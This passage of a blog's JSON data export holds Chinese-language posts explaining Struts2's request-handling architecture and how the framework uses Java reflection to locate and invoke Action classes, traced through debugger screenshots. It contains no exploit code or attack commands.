\"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legsjx.png\" alt=\"legsjx.png\"></p>\n<p><strong>ActionProxy</strong></p>\n<p>ActionProxy用来创建一个ActionInvocation代理实例，除此之外，ActionProxy还会调用ConfigurationManager去读取struts.xml的配置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legovt.png\" alt=\"legovt.png\"></p>\n<p><strong>ConfigurationManager</strong></p>\n<p>ConfigurationManager用来读取struts.xml配置</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/leg4Cd.png\" alt=\"leg4Cd.png\"></p>\n<p><strong>struts.xml</strong></p>\n<p>struts.xml是Stuts2的应用配置文件</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/leg6u6.png\" alt=\"leg6u6.png\"></p>\n<p><strong>ActionInvocation</strong></p>\n<p>通过ActionMapper返回的actionName,namespace等信息调用拦截器并执行Action</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legx8s.png\" alt=\"legx8s.png\"></p>\n<p><strong>Interceptor</strong></p>\n<p>Interceptor是Struts2中的拦截器。在Action运行之前或者Result运行之后来进行执行。默认的Interceptor个数为20个</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/le2FVU.png\" alt=\"le2FVU.png\"></p>\n<p><strong>Action</strong></p>\n<p>Action为开发人员编写的，用来处理请求以及封装数据的模块</p>\n<h2 id=\"Struts2执行流程跟踪\"><a href=\"#Struts2执行流程跟踪\" class=\"headerlink\" title=\"Struts2执行流程跟踪\"></a>Struts2执行流程跟踪</h2><p>首先我们在Struts2的调度中心——StrutsPrepareAndExecuteFilter中的doFilter方法中打个断点</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legRED.png\" alt=\"legRED.png\"></p>\n<p>当Web容器收到请求（HttpServletRequest），在它将请求传递给ActionContextCleanUp、Other<br>filters(SiteMesh,etc)之后，容器将调用FilterDispatcher核心控制器。正如上图所示，程序将会执行到doFilter方法中。</p>\n<p>在doFilter方法中，将会判断请求是否应该由struts2处理<strong>，</strong>下图红框中的代码就是用来进行这步操作</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legbb8.png\" alt=\"legbb8.png\"></p>\n<p>不由struts2处理的请求，将会被doFilter放行，见上图127行</p>\n<p>接着doFilter方法中将会调用ActionMapper处理请求，ActionMapper用来确定请求哪个Action并返回一个ActionMaping对象(mapping),mapping中封装了actionName和namespace等信息</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legz2n.png\" alt=\"legz2n.png\"></p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/le2A54.png\" alt=\"le2A54.png\"></p>\n<p>mapping中封装了请求action的Name以及namespace等信息</p>\n<p>当Mapping不为空时，FilterDispatcher将控制权委派给ActionProxy，下面一些列图片将展示控制权委派的过程</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legHDf.png\" alt=\"legHDf.png\"></p>\n<p>当Mapping不为空时，执行executeAction方法，并传入ActionMaping对象(mapping)</p>\n<p>继续跟入executeAction</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legX5Q.png\" alt=\"legX5Q.png\"></p>\n<p>executeAction中调用serviceAction方法</p>\n<p>继续跟入serviceAction</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legIgI.png\" alt=\"legIgI.png\"></p>\n<p>从上图红框处可见，程序根据mapping中的信息创建创建一个名为proxy的ActionProxy对象</p>\n<p>接着，执行proxy.execute()方法</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legcDK.png\" alt=\"legcDK.png\"></p>\n<p>跟入execute方法，进入DefaultActionProxy</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/leg58A.png\" alt=\"leg58A.png\"></p>\n<p>接着进入DefaultActionInvocation</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/le2Svq.png\" alt=\"le2Svq.png\"></p>\n<p>在DefaultActionInvocation中，程序将会加载拦截器</p>\n<p>加载的默认拦截器共20个，见下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/leggHO.png\" alt=\"leggHO.png\"></p>\n<p>当所有拦截器调用完毕，ActionInvocation调用Action</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/legOUg.png\" alt=\"legOUg.png\"></p>\n<p>最终，请求中对应的开发的人员编写的action将会被加载</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/28/leg7KP.png\" alt=\"leg7KP.png\"></p>\n<p>一旦执行结果返回结果字符串，ActionInvocation将查找结果字符串对应的(Result）然后调用对应的模版（JSP）来呈现页面。</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"xxlegend","link":"http://xxlegend.com/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/xxlegend.png"},{"name":"phithon","link":"https://www.leavesongs.com","avatar":"https://secure.gravatar.com/avatar/c4267eb6d17276fa31c547ac71611e90.jpg?s=100&d=mm&r=g"},{"name":"ADOG","link":"http://foreversong.cn/","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信图片_20200916153556.jpg"},{"name":"kylingit","link":"https://kylingit.com","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/logo.jpg"},{"name":"tsang","link":"https://jontsang.github.io","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/avatar.png"},{"name":"BlBana","link":"https://drops.blbana.cc","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/Misaka.jpg"},{"name":"ChaBug安全","link":"http://www.chabug.org","avatar":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/微信截图_20200918105651.png"}]}]}},"excerpt":"<p>Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。</p>\n<p>Struts2以WebWork为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与ServletAPI完全脱离开</p>","more":"<p>首先我们来看下Struts2的架构图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/le2CrV.png\" alt=\"le2CrV.png\"></p>\n<p>上图中的Key，介绍如下：</p>\n<ul>\n<li><p><strong>Servlet Filters：过滤器链，客户端的所有请求都要经过Filter链的处理。</strong></p>\n</li>\n<li><p><strong>StrutsCore：Struts2的核心部分，但是Struts2已经帮我们做好了，我们不需要去做这个</strong></p>\n</li>\n<li><p><strong>Interceptors，Struts2的拦截器。Struts2提供了很多默认的拦截器，可以完成日常开发的绝大部分工作；而我们自定义的拦截器，用来实现实际的客户业务需要的功能。</strong></p>\n</li>\n<li><p><strong>UserCreated，由开发人员创建的，包括struts.xml、Action、Template，这些是每个使用Struts2来进行开发的人员都必须会的。</strong></p>\n</li>\n</ul>\n<p>上图中的各个元素，介绍如下</p>\n<p><strong>FilterDispatcher/StrutsPrepareAndExecuteFilter</strong></p>\n<p>FilterDispatcher**/**StrutsPrepareAndExecuteFilter是整个Struts2的核心过滤器，它将拦截请求并。在Struts的版本&gt;= 2.1.3，推荐升级到新的Filter-StrutsPrepareAndExecuteFilte</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legf4H.png\" alt=\"legf4H.png\"></p>\n<p><strong>ActionMapper</strong></p>\n<p>FilterDispatcher/StrutsPrepareAndExecuteFilter将会调用ActionMapper处理请求过来的url，判断该请求是否需要struts2来进行处理，如果需要会返回一个包含了actionName,namespace等信息的ActionMapping对象</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legsjx.png\" alt=\"legsjx.png\"></p>\n<p><strong>ActionProxy</strong></p>\n<p>ActionProxy用来创建一个ActionInvocation代理实例，除此之外，ActionProxy还会调用ConfigurationManager去读取struts.xml的配置</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legovt.png\" alt=\"legovt.png\"></p>\n<p><strong>ConfigurationManager</strong></p>\n<p>ConfigurationManager用来读取struts.xml配置</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/leg4Cd.png\" alt=\"leg4Cd.png\"></p>\n<p><strong>struts.xml</strong></p>\n<p>struts.xml是Stuts2的应用配置文件</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/leg6u6.png\" alt=\"leg6u6.png\"></p>\n<p><strong>ActionInvocation</strong></p>\n<p>通过ActionMapper返回的actionName,namespace等信息调用拦截器并执行Action</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legx8s.png\" alt=\"legx8s.png\"></p>\n<p><strong>Interceptor</strong></p>\n<p>Interceptor是Struts2中的拦截器。在Action运行之前或者Result运行之后来进行执行。默认的Interceptor个数为20个</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/le2FVU.png\" alt=\"le2FVU.png\"></p>\n<p><strong>Action</strong></p>\n<p>Action为开发人员编写的，用来处理请求以及封装数据的模块</p>\n<h2 id=\"Struts2执行流程跟踪\"><a href=\"#Struts2执行流程跟踪\" class=\"headerlink\" title=\"Struts2执行流程跟踪\"></a>Struts2执行流程跟踪</h2><p>首先我们在Struts2的调度中心——StrutsPrepareAndExecuteFilter中的doFilter方法中打个断点</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legRED.png\" alt=\"legRED.png\"></p>\n<p>当Web容器收到请求（HttpServletRequest），在它将请求传递给ActionContextCleanUp、Other<br>filters(SiteMesh,etc)之后，容器将调用FilterDispatcher核心控制器。正如上图所示，程序将会执行到doFilter方法中。</p>\n<p>在doFilter方法中，将会判断请求是否应该由struts2处理<strong>，</strong>下图红框中的代码就是用来进行这步操作</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legbb8.png\" alt=\"legbb8.png\"></p>\n<p>不由struts2处理的请求，将会被doFilter放行，见上图127行</p>\n<p>接着doFilter方法中将会调用ActionMapper处理请求，ActionMapper用来确定请求哪个Action并返回一个ActionMaping对象(mapping),mapping中封装了actionName和namespace等信息</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legz2n.png\" alt=\"legz2n.png\"></p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/le2A54.png\" alt=\"le2A54.png\"></p>\n<p>mapping中封装了请求action的Name以及namespace等信息</p>\n<p>当Mapping不为空时，FilterDispatcher将控制权委派给ActionProxy，下面一些列图片将展示控制权委派的过程</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legHDf.png\" alt=\"legHDf.png\"></p>\n<p>当Mapping不为空时，执行executeAction方法，并传入ActionMaping对象(mapping)</p>\n<p>继续跟入executeAction</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legX5Q.png\" alt=\"legX5Q.png\"></p>\n<p>executeAction中调用serviceAction方法</p>\n<p>继续跟入serviceAction</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legIgI.png\" alt=\"legIgI.png\"></p>\n<p>从上图红框处可见，程序根据mapping中的信息创建创建一个名为proxy的ActionProxy对象</p>\n<p>接着，执行proxy.execute()方法</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legcDK.png\" alt=\"legcDK.png\"></p>\n<p>跟入execute方法，进入DefaultActionProxy</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/leg58A.png\" alt=\"leg58A.png\"></p>\n<p>接着进入DefaultActionInvocation</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/le2Svq.png\" alt=\"le2Svq.png\"></p>\n<p>在DefaultActionInvocation中，程序将会加载拦截器</p>\n<p>加载的默认拦截器共20个，见下图</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/leggHO.png\" alt=\"leggHO.png\"></p>\n<p>当所有拦截器调用完毕，ActionInvocation调用Action</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/legOUg.png\" alt=\"legOUg.png\"></p>\n<p>最终，请求中对应的开发的人员编写的action将会被加载</p>\n<p><img src=\"https://s2.ax1x.com/2019/12/28/leg7KP.png\" alt=\"leg7KP.png\"></p>\n<p>一旦执行结果返回结果字符串，ActionInvocation将查找结果字符串对应的(Result）然后调用对应的模版（JSP）来呈现页面。</p>"},{"title":"Struts2从请求到Action——反射机制研究","date":"2020-01-07T07:39:03.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/看见到洞见之楔子.jpg","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\n本文不是对Struts2漏洞进行分析，而是对Struts2框架机制的一些简单的理解。这将有助于对Struts2漏洞进行深入的理解。\n\n<!--more-->\n\n正文\n----\n\nStruts2历史上出现过大大小小几十个漏洞。在分析漏洞的时候，除了需要理解漏洞是如何触发的，我对Struts2框架的原理比较好奇。众所周知，Struts2是通过配置struts.xml来定义请求和处理该请求的Action之间的对应关系等等。\n\nStruts.xml类似下图这样的形式\n\n![7a745298d3d0178fcf6aafb0c8fbc817.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107150944-ae5a3948-311c-1.png)\n\n其中一个问题就是，Struts2是如何将请求和处理action通过struts.xml关联起来的？\n\n其中的过程比较有意思，本文将简单针对这个机制的分析一下\n\nStruts2官网给出的执行流程图如下\n\n![edeb6b0a750daef4e0a968e14f6e2807.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151003-b994e0ba-311c-1.png)\n\n在上图红框处，可见ActionInvocation模块，这一模块将调用拦截器并执行开发者编写的Action。ActionInvocation模块正是解答我们问题的关键之处，后文将从这里开始分析。\n\n在分析流程之前，首先要说明一下：在Struts2框架中，程序将请求和处理action通过struts.xml关联起来的过程是基于java的反射机制实现的。\n\nJava反射机制\n------------\n\n关于java反射，官方给出的解释如下\n\nReflection enables Java code to discover information about the fields, methods\nand constructors of loaded classes, and to use reflected fields, methods, and\nconstructors to operate on their underlying counterparts, within security\nrestrictions.  \nThe API accommodates applications that need access to either the public members\nof a target object (based on its runtime class) or the members declared by a\ngiven class. It also allows programs to suppress default reflective access\ncontrol.\n\n百度词条给出的解释如下\n\nJAVA反射机制是在运行状态中，对于任意一个实体类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。\n\n针对于反射机制，我的理解是：通常情况下，我们在编译前需要确定类型并创建对象；但反射机制使得我们可以在运行时动态地创建对象并调用其属性，即使此时的对象类型在编译期是没有被确定的。\n\n关于反射简单的使用，可以见一下代码\n\n以下代码改编自<http://tengj.top/2016/04/28/javareflect/>\n\n大家可以看看这个文章，写的非常详细，我节选了其中一个简单的案例进行简单的介绍\n\nReflectDemo.java\n\n![d4ad6409be4ceee62a69c731f3778788.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151015-c0e085c2-311c-1.png)\n\nPerson类\n\n![a841d0ce7541078e003c64818a90db4a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151022-c4e506e8-311c-1.png)\n\n接下来我们详细的分析下：\n\n首先看下图红框处这一行\n\n![2c55b98575b6dddaa8729daa6b8fde20.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151029-c99e30d8-311c-1.png)\n\n这里使用了Class.forName(\"com.grq.reflect.Person\")\n生成了一个名为c的Person类的Class。这里的c为Class类型，Class.forName\n方法的作用就是初始化给定的类\n\n生成Person类的Class大致有三种方法，除了demo中给出的，还有如下两种，见下图\n\n![0d298df35d8bfe6c2abb46bbe55bac9f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151043-d1c8923a-311c-1.png)\n\n分别是通过获取类的静态成员变量class与通过对象的getClass()方法获取Class\n\n回到正文，接下来看下图红框处这一行\n\n![b44769116bbaedd23b2c53cdc6978593.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151052-d6c5544e-311c-1.png)\n\nnewInstance方法可以初始化生成一个实例。newInstance方法最终调用public无参构造函数。如果类没有public无参数的构造函数就会报错了。如果我们把Person类中的public无参数构造方法删除，就会出现对应下图的报错\n\n![6744b9ce5559b604b226564358d675c6.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151100-dc1c69a0-311c-1.png)\n\nnewInstance()方法与new关键字类似但却不同：newInstance()使用的是类加载机制，而new关键字是创建一个新对象\n\n接下来看下图红框处这一行\n\n![6962a7052fde7cbc3b18bf27d4b21f71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151109-e171763e-311c-1.png)\n\ngetMethod方法可以得到该类不包括父类的所有的方法，通过传入参数确定具体要获得的方法。这里通过c.getMethod(\"fun\",String.class, int.class)获得Person类的fun方法\n\n接下来看下图红框处这一行\n\n![7a376a707b6755f1156b535643d3b8f4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151118-e6627daa-311c-1.png)\n\ninvoke的作用是执行方法，如果这个方法是一个普通方法，那么第一个参数是类对象,如果这个方法是一个静态方法，那么第一个参数是类。后面的参数为将要传递的参数值\n\n执行结果如下\n\n![31ad77d7773a070cd0757bd4e1ae48a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151128-ec6bf6d6-311c-1.png)\n\n到此，简单的Java反射机制介绍结束。\n\n### 一种不同的写法\n\n![3e025137eb06925d78af77371bbecdeb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151138-f2b01e8c-311c-1.png)\n\n在上图中，我们使用o.getClass()代替c，最终的结果如下图\n\n![0abe72def9e4b294cdc147d7007b49d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151153-fba00476-311c-1.png)\n\n可见o.getClass与c的Class对象所表示的实体名称是一致的，都是com.grq.reflect.Person。为什么要举这个例子呢？，因为Struts2里就是采用o.getClass这种形式进行反射的。\n\nStruts2反射机制\n---------------\n\n首先我们用S2-001的Deme进行举例\n\n![7d91ec6535988f2edd189c7207305c0d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151206-0359e434-311d-1.png)\n\n当http://localhost:8080/s2_t_war_exploded/login.action\n请求发送到后台时，让我们来看一下struts2是如何利用反射机制寻找到对应的LoginAction类进行处理\n\n跟入后台com/opensymphony/xwork2/DefaultActionInvocation.java文件\n\n程序调用invokeAction方法寻找用来处理请求的action类与对应的方法\n\n![3d16b7c6b7d4daec699fdefe85b9c734.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151235-14bcbc88-311d-1.png)\n\n在invokeAction方法中的404行处，见上图，程序最终通过invoke执行对应action类对象(上图红框处action)的对应方法(上图红框处method)\n\n我们接下来分析下action类对象以及对应方法的生成过程\n\n### 类对象的生成\n\n首先我们来分析下下图中红框处的类对象是怎么获得的\n\n![54c598ae0df1ee0c457c190aff11eb9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151243-1945e7d4-311d-1.png)\n\ninvokeAction方法见下图\n\n![c98ad56cf48b5503128856bc55a4433f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151251-1db5c384-311d-1.png)\n\nInvoke中传入的Object类型的action参数其实是在invokeAction被调用时传递进来的\n\n接着我们来看一下invokeAction被调用时的情况，见下图\n\n![cb333de473a98d0e3fadfb776b480d33.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151258-21fc5872-311d-1.png)\n\n从上图可见，action参数是通过getAction方法获得\n\n跟入getAction方法\n\n![7dd8c940303541080e8d767c38105dee.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151308-28102e6e-311d-1.png)\n\ngetAction方法直接将action返回\n\n接着看下这个action是如何生成的，见下图\n\n![06895aa95cc394121d527a90da29ed13.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151323-30c40c56-311d-1.png)\n\n从上图可见，action其实是由buildAction方法生成\n\n接着来跟一下buildAction方法，见下图\n\n![48b46e2180c5d6db6405ee2b0ff41045.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151332-368f0d20-311d-1.png)\n\nbuildAction方法的作用是通过读取struts.xml中的配置，构建操作类的实例以处理特定请求（例如，Web请求）并最终返回一个用来处理web请求的action类的实例。从上图可见，buildAction方法会调用buildBean方法以返回用来处理web请求的action类的实例\n\n我们跟入buildBean方法中，看一下传入的config.getClassName()是什么，具体见下图\n\n![62369956c2b679acc8560be6686fbe45.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151340-3b6c622a-311d-1.png)\n\nbuildBean方法的作用是构建给定类型的通用Java object。这里的传入buildBean方法的className是一个String类型的字符串，值为com.demo.action.LoginAction，这是根据我们struts.xml中的配置得来见下图\n\n![05a227b38e238c07a5e0b1b4c67a31cc.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151349-409c45ee-311d-1.png)\n\n在struts.xml中，配置了Name为login的请求对应class为com.demo.action.LoginAction\n\n回到createAction方法中，此时类对象的生成过程已经明确了，最终invoke方法中的action参数其实是Object类型的LoginAction类的实例\n\n### method的生成\n\n接着我们来分析下下图中红框处的method是如何获得的\n\n![0a81230905512b16cdedc98c7efd35ec.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151359-46849114-311d-1.png)\n\nmethod是在invokeAction中392行处这里生成，见下图红框处\n\n![179799d70af0f7d7338380d993abd40d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151412-4e8d59c2-311d-1.png)\n\n首先看下getAction方法，这个方法在上文类对象生成一节已经分析过了，针对被例来说，该方法返回了一个Object类型的LoginAction类的实例。\n\n接着，通过getClass方法由LoginAction类的实例获取LoginAction类的class对象，这里可以参考上文java反射一章中最后的那个例子。\n\n最后通过getMethod方法，传入methodName(默认execute)，获取LoginAction类的execute方法\n\n### invoke执行\n\n上文已经将method与action分析完毕。最终程序将调用invoke执行LoginAction类的execute方法来处理请求\n\n![166379e4abc2b4baa643e37ed64064ce.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151425-55b78650-311d-1.png)\n\n参考链接\n--------\n\nhttp://tengj.top/2016/04/28/javareflect/","source":"_posts/strutsReflect.md","raw":"---\ntitle: Struts2从请求到Action——反射机制研究\ndate: 2020-01-07 15:39:03\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/看见到洞见之楔子.jpg\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\n本文不是对Struts2漏洞进行分析，而是对Struts2框架机制的一些简单的理解。这将有助于对Struts2漏洞进行深入的理解。\n\n<!--more-->\n\n正文\n----\n\nStruts2历史上出现过大大小小几十个漏洞。在分析漏洞的时候，除了需要理解漏洞是如何触发的，我对Struts2框架的原理比较好奇。众所周知，Struts2是通过配置struts.xml来定义请求和处理该请求的Action之间的对应关系等等。\n\nStruts.xml类似下图这样的形式\n\n![7a745298d3d0178fcf6aafb0c8fbc817.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107150944-ae5a3948-311c-1.png)\n\n其中一个问题就是，Struts2是如何将请求和处理action通过struts.xml关联起来的？\n\n其中的过程比较有意思，本文将简单针对这个机制的分析一下\n\nStruts2官网给出的执行流程图如下\n\n![edeb6b0a750daef4e0a968e14f6e2807.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151003-b994e0ba-311c-1.png)\n\n在上图红框处，可见ActionInvocation模块，这一模块将调用拦截器并执行开发者编写的Action。ActionInvocation模块正是解答我们问题的关键之处，后文将从这里开始分析。\n\n在分析流程之前，首先要说明一下：在Struts2框架中，程序将请求和处理action通过struts.xml关联起来的过程是基于java的反射机制实现的。\n\nJava反射机制\n------------\n\n关于java反射，官方给出的解释如下\n\nReflection enables Java code to discover information about the fields, methods\nand constructors of loaded classes, and to use reflected fields, methods, and\nconstructors to operate on their underlying counterparts, within security\nrestrictions.  \nThe API accommodates applications that need access to either the public members\nof a target object (based on its runtime class) or the members declared by a\ngiven class. It also allows programs to suppress default reflective access\ncontrol.\n\n百度词条给出的解释如下\n\nJAVA反射机制是在运行状态中，对于任意一个实体类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；这种动态获取信息以及动态调用对象方法的功能称为java语言的反射机制。\n\n针对于反射机制，我的理解是：通常情况下，我们在编译前需要确定类型并创建对象；但反射机制使得我们可以在运行时动态地创建对象并调用其属性，即使此时的对象类型在编译期是没有被确定的。\n\n关于反射简单的使用，可以见一下代码\n\n以下代码改编自<http://tengj.top/2016/04/28/javareflect/>\n\n大家可以看看这个文章，写的非常详细，我节选了其中一个简单的案例进行简单的介绍\n\nReflectDemo.java\n\n![d4ad6409be4ceee62a69c731f3778788.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151015-c0e085c2-311c-1.png)\n\nPerson类\n\n![a841d0ce7541078e003c64818a90db4a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151022-c4e506e8-311c-1.png)\n\n接下来我们详细的分析下：\n\n首先看下图红框处这一行\n\n![2c55b98575b6dddaa8729daa6b8fde20.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151029-c99e30d8-311c-1.png)\n\n这里使用了Class.forName(\"com.grq.reflect.Person\")\n生成了一个名为c的Person类的Class。这里的c为Class类型，Class.forName\n方法的作用就是初始化给定的类\n\n生成Person类的Class大致有三种方法，除了demo中给出的，还有如下两种，见下图\n\n![0d298df35d8bfe6c2abb46bbe55bac9f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151043-d1c8923a-311c-1.png)\n\n分别是通过获取类的静态成员变量class与通过对象的getClass()方法获取Class\n\n回到正文，接下来看下图红框处这一行\n\n![b44769116bbaedd23b2c53cdc6978593.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151052-d6c5544e-311c-1.png)\n\nnewInstance方法可以初始化生成一个实例。newInstance方法最终调用public无参构造函数。如果类没有public无参数的构造函数就会报错了。如果我们把Person类中的public无参数构造方法删除，就会出现对应下图的报错\n\n![6744b9ce5559b604b226564358d675c6.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151100-dc1c69a0-311c-1.png)\n\nnewInstance()方法与new关键字类似但却不同：newInstance()使用的是类加载机制，而new关键字是创建一个新对象\n\n接下来看下图红框处这一行\n\n![6962a7052fde7cbc3b18bf27d4b21f71.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151109-e171763e-311c-1.png)\n\ngetMethod方法可以得到该类不包括父类的所有的方法，通过传入参数确定具体要获得的方法。这里通过c.getMethod(\"fun\",String.class, int.class)获得Person类的fun方法\n\n接下来看下图红框处这一行\n\n![7a376a707b6755f1156b535643d3b8f4.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151118-e6627daa-311c-1.png)\n\ninvoke的作用是执行方法，如果这个方法是一个普通方法，那么第一个参数是类对象,如果这个方法是一个静态方法，那么第一个参数是类。后面的参数为将要传递的参数值\n\n执行结果如下\n\n![31ad77d7773a070cd0757bd4e1ae48a5.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151128-ec6bf6d6-311c-1.png)\n\n到此，简单的Java反射机制介绍结束。\n\n### 一种不同的写法\n\n![3e025137eb06925d78af77371bbecdeb.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151138-f2b01e8c-311c-1.png)\n\n在上图中，我们使用o.getClass()代替c，最终的结果如下图\n\n![0abe72def9e4b294cdc147d7007b49d7.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151153-fba00476-311c-1.png)\n\n可见o.getClass与c的Class对象所表示的实体名称是一致的，都是com.grq.reflect.Person。为什么要举这个例子呢？，因为Struts2里就是采用o.getClass这种形式进行反射的。\n\nStruts2反射机制\n---------------\n\n首先我们用S2-001的Deme进行举例\n\n![7d91ec6535988f2edd189c7207305c0d.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151206-0359e434-311d-1.png)\n\n当http://localhost:8080/s2_t_war_exploded/login.action\n请求发送到后台时，让我们来看一下struts2是如何利用反射机制寻找到对应的LoginAction类进行处理\n\n跟入后台com/opensymphony/xwork2/DefaultActionInvocation.java文件\n\n程序调用invokeAction方法寻找用来处理请求的action类与对应的方法\n\n![3d16b7c6b7d4daec699fdefe85b9c734.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151235-14bcbc88-311d-1.png)\n\n在invokeAction方法中的404行处，见上图，程序最终通过invoke执行对应action类对象(上图红框处action)的对应方法(上图红框处method)\n\n我们接下来分析下action类对象以及对应方法的生成过程\n\n### 类对象的生成\n\n首先我们来分析下下图中红框处的类对象是怎么获得的\n\n![54c598ae0df1ee0c457c190aff11eb9a.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151243-1945e7d4-311d-1.png)\n\ninvokeAction方法见下图\n\n![c98ad56cf48b5503128856bc55a4433f.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151251-1db5c384-311d-1.png)\n\nInvoke中传入的Object类型的action参数其实是在invokeAction被调用时传递进来的\n\n接着我们来看一下invokeAction被调用时的情况，见下图\n\n![cb333de473a98d0e3fadfb776b480d33.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151258-21fc5872-311d-1.png)\n\n从上图可见，action参数是通过getAction方法获得\n\n跟入getAction方法\n\n![7dd8c940303541080e8d767c38105dee.png](https://xzfile.aliyuncs.com/media/upload/picture/20200107151308-28102e6e-311d-1.png)\n\ngetAction方法直接将action返回\n\n接着看下这个action是如何生成的，见下图\n\n![06895aa95cc394121d527a90da29ed1